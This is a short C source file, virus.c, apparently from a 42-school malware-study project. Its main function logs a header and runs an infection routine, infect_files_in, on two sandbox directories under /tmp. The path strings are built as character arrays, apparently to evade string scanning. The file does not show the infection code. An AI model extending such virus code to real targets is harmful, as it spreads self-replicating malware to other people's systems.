/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   virus.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/07 06:36:21 by agrumbac          #+#    #+#             */
/*   Updated: 2021/06/15 19:42:08 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "compiler_utils.h"
#include "virus.h"
#include "log.h"

void	virus(struct virus_header *vhdr)
{
	log_virus_header(vhdr);

	const char *playgrounds[] =
	{
		(char[10]){'/','t','m','p','/','t','e','s','t','\0'},
		(char[11]){'/','t','m','p','/','t','e','s','t','2','\0'}
	};

	for (unsigned long i = 0; i < ARRAY_SIZE(playgrounds); i++)
	{
		infect_files_in(vhdr, playgrounds[i]);
	}
}
